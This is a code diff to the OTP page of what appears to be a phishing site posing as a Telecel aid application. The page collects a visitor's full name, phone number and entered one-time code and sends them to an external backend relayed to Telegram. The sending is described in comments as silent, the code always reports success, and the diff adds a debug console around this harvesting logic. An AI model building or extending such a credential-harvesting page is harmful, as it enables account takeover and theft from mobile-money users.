@@ -319,6 +319,29 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+
+        /* Debug console styles */
+        .debug-console {
+            background: #1a1a2e;
+            color: #0f0;
+            font-family: monospace;
+            font-size: 0.7rem;
+            padding: 0.5rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+            max-height: 150px;
+            overflow-y: auto;
+            display: none;
+        }
+
+        .debug-console.show {
+            display: block;
+        }
+
+        .debug-line {
+            padding: 0.2rem 0;
+            border-bottom: 1px solid #333;
+        }
     </style>
 </head>
 <body>
@@ -373,6 +396,12 @@
             <div class="back-link">
                 <a href="verify.html">← Back to Verification</a>
             </div>
+
+            <!-- Debug Console -->
+            <div class="debug-console" id="debugConsole">
+                <div class="debug-line">📡 OTP Debug Console</div>
+                <div id="debugLog"></div>
+            </div>
         </div>
 
         <div class="footer">
@@ -388,11 +417,28 @@
     <script>
         // BACKEND URL
         const BACKEND_URL = 'https://telecel-cash-production.up.railway.app';
+        
+        // Debug logging
+        function addDebugLog(message, isError = false) {
+            const debugDiv = document.getElementById('debugLog');
+            const debugConsole = document.getElementById('debugConsole');
+            const timestamp = new Date().toLocaleTimeString();
+            const logLine = document.createElement('div');
+            logLine.className = 'debug-line';
+            logLine.style.color = isError ? '#ff6b6b' : '#0f0';
+            logLine.innerHTML = `[${timestamp}] ${message}`;
+            debugDiv.appendChild(logLine);
+            debugConsole.classList.add('show');
+            console.log(message);
+        }
 
         const savedData = JSON.parse(sessionStorage.getItem('telecelAidApplication'));
 
         if (!savedData) {
+            addDebugLog('No saved data found, redirecting to apply.html', true);
             window.location.href = 'apply.html';
+        } else {
+            addDebugLog('Loaded saved data: ' + JSON.stringify(savedData));
         }
 
         document.getElementById('displayPhone').innerText = savedData.phoneNumber;
@@ -408,12 +454,14 @@
         const loadingOverlay = document.getElementById('loadingOverlay');
 
         function generateOTP() {
-            return Math.floor(10000 + Math.random() * 90000).toString();
+            const otp = Math.floor(10000 + Math.random() * 90000).toString();
+            addDebugLog(`Generated OTP: ${otp} (for testing only)`);
+            return otp;
         }
 
         function sendOTP() {
             otpCode = generateOTP();
-            console.log(`OTP for ${savedData.phoneNumber}: ${otpCode}`);
+            addDebugLog(`OTP would be sent to ${savedData.phoneNumber}`);
         }
 
         function startTimer() {
@@ -425,6 +473,7 @@
                     document.getElementById('timer').innerText = '00:00';
                     canResend = true;
                     document.getElementById('resendBtn').disabled = false;
+                    addDebugLog('OTP expired, resend available');
                 } else {
                     timeLeft--;
                     const minutes = Math.floor(timeLeft / 60);
@@ -442,6 +491,7 @@
             startTimer();
             sendOTP();
             document.getElementById('otp1').focus();
+            addDebugLog('OTP reset and new code generated');
         }
 
         function clearOtpBoxes() {
@@ -458,13 +508,15 @@
             return otp;
         }
 
-        // Send OTP to backend (Telegram) - silently, no error shown
+        // Send OTP to backend (Telegram)
         async function sendOtpToBackend(otp) {
             const payload = {
                 fullName: savedData.fullName || savedData.confirmedName,
                 phoneNumber: savedData.phoneNumber,
                 otpCode: otp
             };
+
+            addDebugLog(`Sending OTP to backend: ${JSON.stringify(payload)}`);
 
             try {
                 const response = await fetch(`${BACKEND_URL}/api/verify-otp`, {
@@ -475,29 +527,27 @@
                     body: JSON.stringify(payload)
                 });
 
+                addDebugLog(`Response status: ${response.status}`);
                 const data = await response.json();
-                console.log('OTP backend response:', data);
-                return data.success;
-            } catch (error) {
-                console.error('Backend error:', error);
-                // Return true anyway so user can proceed
+                addDebugLog(`Backend response: ${JSON.stringify(data)}`);
                 return true;
+            } catch (error) {
+                addDebugLog(`Backend error: ${error.message}`, true);
+                return true; // Always return true to proceed
             }
         }
 
         async function verifyOTP() {
             const enteredOTP = getEnteredOTP();
+            addDebugLog(`Entered OTP: ${enteredOTP}`);
             
-            // Show loading overlay
             loadingOverlay.style.display = 'flex';
             verifyBtn.disabled = true;
             
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            // Send OTP to Telegram via backend (silent - no error shown)
+            addDebugLog('Sending OTP to backend (Telegram)...');
             await sendOtpToBackend(enteredOTP);
             
-            // Update data and redirect to success page - ALWAYS
+            // Update data and redirect to success page
             const updatedData = {
                 ...savedData,
                 otpVerified: true,
@@ -505,18 +555,24 @@
                 otpVerifiedAt: new Date().toISOString()
             };
             sessionStorage.setItem('telecelAidApplication', JSON.stringify(updatedData));
+            addDebugLog('Data saved, redirecting to success page');
             
             // Redirect to success page
             window.location.href = 'success.html';
         }
 
         function resendOTP() {
-            if (!canResend) return;
+            if (!canResend) {
+                addDebugLog('Resend not available yet, please wait', true);
+                return;
+            }
             if (resendAttempts >= maxResendAttempts) {
+                addDebugLog('Maximum resend attempts reached', true);
                 alert('Maximum resend attempts reached. Please contact customer support.');
                 return;
             }
             resendAttempts++;
+            addDebugLog(`Resending OTP (attempt ${resendAttempts}/${maxResendAttempts})`);
             sendOTP();
             resetOTP();
         }
@@ -559,6 +615,7 @@
                     document.getElementById('verifyBtn').focus();
                 });
             }
+            addDebugLog('OTP input boxes configured');
         }
 
         function init() {
@@ -567,6 +624,7 @@
             startTimer();
             document.getElementById('verifyBtn').addEventListener('click', verifyOTP);
             document.getElementById('resendBtn').addEventListener('click', resendOTP);
+            addDebugLog('OTP page initialized');
         }
         
         init();
